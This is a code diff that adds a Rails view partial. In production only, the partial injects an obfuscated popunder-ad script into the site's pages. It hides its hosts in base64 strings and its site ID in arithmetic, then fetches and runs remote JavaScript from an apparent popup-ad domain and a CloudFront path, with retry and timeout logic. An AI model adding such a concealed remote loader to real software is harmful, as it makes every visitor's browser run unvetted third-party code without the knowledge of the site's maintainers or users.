@@ -1,0 +1,37 @@
+<% if Rails.env.production? %>
+  <script type="text/javascript" data-cfasync="false">
+      /*<![CDATA[/* */
+      (function () {
+          var n = window, z = "eea92e30e70d669dcc3d56d1b3d43277",
+              k = [["siteId", 698 * 383 + 675 - 876 * 298 + 5130595], ["minBid", 0], ["popundersPerIP", "0"], ["delayBetween", 0], ["default", false], ["defaultPerDay", 0], ["topmostLayer", "auto"]],
+              h = ["d3d3LmludGVsbGlwb3B1cC5jb20vc2hhbmRsZWJhcnMubWluLmNzcw==", "ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQva0FHZmptL3FwYXRoLm1pbi5qcw=="],
+              q = -1, t, m, r = function () {
+                  clearTimeout(m);
+                  q++;
+                  if (h[q] && !(1753330516000 < (new Date).getTime() && 1 < q)) {
+                      t = n.document.createElement("script");
+                      t.type = "text/javascript";
+                      t.async = !0;
+                      var d = n.document.getElementsByTagName("script")[0];
+                      t.src = "https://" + atob(h[q]);
+                      t.crossOrigin = "anonymous";
+                      t.onerror = r;
+                      t.onload = function () {
+                          clearTimeout(m);
+                          n[z.slice(0, 16) + z.slice(0, 16)] || r()
+                      };
+                      m = setTimeout(r, 5E3);
+                      d.parentNode.insertBefore(t, d)
+                  }
+              };
+          if (!n[z]) {
+              try {
+                  Object.freeze(n[z] = k)
+              } catch (e) {
+              }
+              r()
+          }
+      })();
+      /*]]>/* */
+  </script>
+<% end %>
